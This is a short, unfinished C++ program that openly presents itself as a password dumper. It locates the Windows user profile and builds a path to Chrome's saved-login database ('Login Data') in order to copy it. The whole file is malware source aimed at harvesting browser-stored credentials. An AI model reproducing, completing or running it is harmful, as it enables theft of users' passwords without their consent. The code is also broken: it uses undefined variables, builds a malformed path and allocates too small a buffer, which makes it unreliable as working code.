
#include "sqlite3.h"
#include <windows.h>
#include <stdio.h>
#include <userenv.h>
#include <string>


int main(){
    printf("I dump passwords!\n");
    HANDLE hToken =  GetCurrentProcessToken();

    DWORD lpcchSize = 30;
    LPSTR lpProfileDir = (LPSTR) malloc(lpcchSize);
    if (!GetUserProfileDirectoryA(hToken, lpProfileDir,&lpcchSize  )){
        printf("didnt get path\n");
        return -1;
    }

    //printf("%s: \n",lpProfileDir);


    std::string db_path = std::string(lpProfileDir) + std::string("AppData/Local/Google/Chrome/User Data/default/Login Data");
    //copy the file contents to a new file
    STARTUPINFOA si;
    HANDLE fh = CreateFile(outfile, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_WRITE| FILE_SHARE_READ, sa, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); //not sure about share mode param
    
}
